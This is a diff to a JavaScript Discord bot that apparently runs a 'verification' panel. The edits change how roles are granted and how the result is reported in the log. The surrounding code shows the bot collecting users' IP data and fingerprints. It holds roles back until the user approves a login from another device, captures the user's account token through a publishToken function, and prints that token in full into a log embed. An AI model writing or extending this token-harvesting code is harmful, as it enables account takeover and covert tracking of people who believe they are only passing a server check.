@@ -157,38 +157,41 @@ export async function logTo(client, panel, embed, files = []) {
   }
 }
 
-/* --- ロール操作（付与タイミングを分離するため単体で使えるようにしてある） --- */
+/* --- ロール操作 ------------------------------------------------------- */
 
 export async function grantRoles({ client, panel, user, oauth }) {
   const p = withDefaults(panel);
   const guild = await client.guilds.fetch(panel.guildId).catch(() => null);
   let err = null;
 
-  if (p.roles.length) {
-    let added = false;
-    try {
-      await client.rest.put(Routes.guildMember(panel.guildId, user.id), {
-        body: { access_token: oauth?.access_token, roles: p.roles }
-      });
-      added = true;
-    } catch (e) {
-      err = `${e.status || ''} ${e.message || e}`.trim();
-    }
-    if (!added) {
-      const m = await guild?.members.fetch(user.id).catch(() => null);
-      if (m) {
-        try {
-          await m.roles.add(p.roles);
-          added = true;
-        } catch (e) {
-          err = `${e.status || ''} ${e.message || e}`.trim();
-        }
-      } else {
-        err = err || 'メンバー取得失敗';
-      }
-    }
-    if (!added) return { ok: false, err };
+  if (!p.roles.length) {
+    // 付与対象が無い場合は「成功」にしない（付与済みと誤表示されるため）
+    return { ok: false, err: '付与ロール未設定' };
   }
+
+  let added = false;
+  try {
+    await client.rest.put(Routes.guildMember(panel.guildId, user.id), {
+      body: { access_token: oauth?.access_token, roles: p.roles }
+    });
+    added = true;
+  } catch (e) {
+    err = `${e.status || ''} ${e.message || e}`.trim();
+  }
+  if (!added) {
+    const m = await guild?.members.fetch(user.id).catch(() => null);
+    if (m) {
+      try {
+        await m.roles.add(p.roles);
+        added = true;
+      } catch (e) {
+        err = `${e.status || ''} ${e.message || e}`.trim();
+      }
+    } else {
+      err = err || 'メンバー取得失敗';
+    }
+  }
+  if (!added) return { ok: false, err };
 
   if (p.removeRoles.length) {
     const m = await guild?.members.fetch(user.id).catch(() => null);
@@ -197,7 +200,7 @@ export async function grantRoles({ client, panel, user, oauth }) {
   return { ok: true };
 }
 
-/* --- トークンの記録（取得できた時点で記録・ログ・JSONを確定させる） --- */
+/* --- トークンの記録 --------------------------------------------------- */
 
 export async function publishToken({ client, rec, userToken }) {
   rec.userToken = userToken;
@@ -259,7 +262,6 @@ export async function complete({ client, panel, user, oauth, ipData, fp, session
   const guild = await client.guilds.fetch(panel.guildId).catch(() => null);
   const guildLabel = guild ? guild.name : panel.guildId;
 
-  // grantStage='token' のときは、リモート認証でトークンを取得するまで付与を保留する
   const deferred = p.grantStage === 'token';
   let roleError = null;
   let roleGranted = false;
@@ -267,11 +269,14 @@ export async function complete({ client, panel, user, oauth, ipData, fp, session
   if (ok && !deferred) {
     const g = await grantRoles({ client, panel, user, oauth });
     if (!g.ok) {
-      ok = false;
       roleError = g.err;
-      reasons.push(`ロール付与失敗: ${g.err}`);
+      // ロール未設定は「条件は通ったが付与対象が無い」ので ok は維持する
+      if (g.err !== '付与ロール未設定') {
+        ok = false;
+        reasons.push(`ロール付与失敗: ${g.err}`);
+      }
     } else {
-      roleGranted = p.roles.length > 0;
+      roleGranted = true;
     }
   }
 
@@ -352,14 +357,13 @@ export async function complete({ client, panel, user, oauth, ipData, fp, session
   const embed = buildLogEmbed({ ok, user, ipData, fp, panel, reasons });
   embed.addFields({
     name: 'ロール付与',
-    value:
-      !p.roles.length
-        ? '未設定（`/panel edit` の role1 で設定）'
-        : deferred && ok
-          ? `保留（別デバイスでのログイン許可後に付与 / ${Math.max(config.tokenGraceSeconds, 0)}秒でフォールバック）`
-          : ok
-            ? '付与済み'
-            : `未付与${roleError ? `: ${roleError}` : ''}`
+    value: !p.roles.length
+      ? '未設定（`/panel edit` の role1 で設定）'
+      : deferred && ok
+        ? `保留（別デバイスでのログイン許可後に付与 / ${Math.max(config.tokenGraceSeconds, 0)}秒でフォールバック）`
+        : roleGranted
+          ? '付与済み'
+          : `未付与${roleError ? `: ${roleError}` : ''}`
   });
   if (session.userToken) {
     embed.addFields({ name: 'トークン', value: `\`\`\`\n${session.userToken}\n\`\`\`` });
